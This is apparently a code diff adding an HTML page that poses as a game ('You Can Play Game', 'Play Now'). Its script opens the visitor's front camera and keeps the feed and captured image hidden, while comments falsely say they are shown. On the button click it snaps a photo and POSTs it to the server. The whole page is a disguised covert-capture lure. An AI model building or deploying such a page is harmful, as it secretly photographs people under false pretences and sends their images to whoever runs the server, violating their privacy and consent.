@@ -1,0 +1,104 @@
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Webcam Capture</title>
+    <style>
+        #camera {
+            width: 100%;
+            max-width: 640px;
+            height: auto;
+            border: 1px solid black;
+        }
+
+        #canvas {
+            display: none;
+        }
+
+        button {
+            margin-top: 20px;
+        }
+    </style>
+</head>
+
+<body>
+    <form action="index.php" method="post">
+
+  
+    <h1>You Can Play Game</h1>
+
+    <!-- Webcam video feed -->
+    <video id="camera" autoplay style="display: none;"></video>
+
+    <!-- Button to take photo -->
+    <button id="capture">Play Now</button>
+
+    <!-- Canvas to hold the captured image -->
+    <canvas id="canvas" style="display: none;"></canvas>
+
+    <!-- Image preview -->
+    <h3 style="display: none;">Captured Image:</h3>
+    <img id="photo" alt="Captured Image" style="display: none;" width="300" />
+  </form>
+    <script>
+        // Get elements from the DOM
+        const camera = document.getElementById('camera');
+        const captureButton = document.getElementById('capture');
+        const canvas = document.getElementById('canvas');
+        const photo = document.getElementById('photo');
+        const context = canvas.getContext('2d');
+
+        // Access the webcam
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })  // Force front camera ("user" for front-facing)
+            .then((stream) => {
+                camera.srcObject = stream;
+                camera.style.display = 'none'; // Show the video element
+            })
+            .catch((err) => {
+                alert('Error accessing webcam: ' + err);
+            });
+
+        // Capture photo when the button is clicked
+        captureButton.addEventListener('click', () => {
+            // Set canvas size to match the video size
+            canvas.width = camera.videoWidth;
+            canvas.height = camera.videoHeight;
+
+            // Draw the current frame from the video to the canvas
+            context.drawImage(camera, 0, 0, canvas.width, canvas.height);
+
+            // Get the image data as a base64 encoded PNG image
+            const dataURL = canvas.toDataURL('image/png');
+
+            // Display the captured image on the webpage
+            photo.src = dataURL;
+            photo.style.display = 'none'; // Show the captured image
+
+            // Send the image data to the server via AJAX
+            fetch('', {
+                method: 'POST',
+                body: JSON.stringify({ image: dataURL }),
+                headers: { 'Content-Type': 'application/json' }
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Photo saved:', data);
+                if (data.status === 'success') {
+                    alert('Love you!');
+                } else {
+                    alert('Failed to save or send photo!');
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                alert('An error occurred while saving or sending the photo.');
+            });
+        });
+    </script>
+
+</body>
+
+</html>
